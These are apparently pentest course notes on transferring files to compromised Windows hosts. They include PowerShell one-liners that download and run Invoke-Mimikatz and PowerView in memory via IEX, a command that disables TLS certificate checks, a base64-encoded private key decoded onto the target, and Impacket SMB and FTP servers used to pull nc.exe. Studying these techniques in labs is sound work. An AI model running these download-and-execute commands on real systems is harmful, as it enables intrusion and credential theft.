# File Transfers
- [Windows File Transfer Methods](#windows-file-transfer-methods)
    - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
    - [SMB Downloads](#smb-downloads)
    - [FTP Downloads](#ftp-downloads)


## Windows File Transfer Methods
### PowerShell Base64 Encode & Decode
- Encode the file using base64 util in our attack box `cat id_rsa |base64 -w 0;echo`
- We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums: `md5sum id_rsa`
- Then, decode using powershell 
```
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
- Use `Get-FileHash` to ensure that file transferred successfully.

> [!NOTE]
> While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.


### PowerShell Web Downloads

- PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

|Method	 |   Description   |
|:-------|:----------------|
|OpenRead|	Returns the data from a resource as a Stream.|
|OpenReadAsync|	Returns the data from a resource without blocking the calling thread.|
|DownloadData|	Downloads data from a resource and returns a Byte array.|
|DownloadDataAsync|	Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|DownloadFile|	Downloads data from a resource to a local file.|
|DownloadFileAsync|	Downloads data from a resource to a local file without blocking the calling thread.|
|DownloadString|	Downloads a String from a resource and returns a String.|
|DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|

#### PowerShell DownloadFile Method
- File Download
```
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

- PowerShell DownloadString - Fileless Method
    - PowerShell can be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
```
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

```
> [!NOTE] IEX also accepts pipeline input. 
```
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```
- From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available.
```
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
#### Common Errors with PowerShell
1. There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`
```
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
2. Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads

- We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.

1. Create the SMB Server `sudo impacket-smbserver share -smb2support /tmp/smbshare`
2. Copy a File from the SMB Server `copy \\ATTACKING_BOX\share\nc.exe`

- New versions of Windows block unauthenticated guest access, as we can see in the following command: 
```
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
- To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine: 
1. Create the SMB Server with username and password `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
2. Mount the SMB Server with Username and Password `net use n: \\ATTACKING_BOX\share /user:test test`

> [!NOTE]
> You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

### FTP Downloads

- We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. Installing the FTP Server Python3 Module - pyftpdlib: `sudo pip3 install pyftpdlib`

> [!NOTE]
> We can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.

- Setting up a Python3 FTP Server: `sudo python3 -m pyftpdlib --port 21`
- After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

> [!TIP]
> When we get a shell on a remote machine, we may not have an interactive shell. 
> If that's the case, we can create an FTP command file to download a file. 
> First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
> Create a Command File for the FTP Client and Download the Target File:
```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```


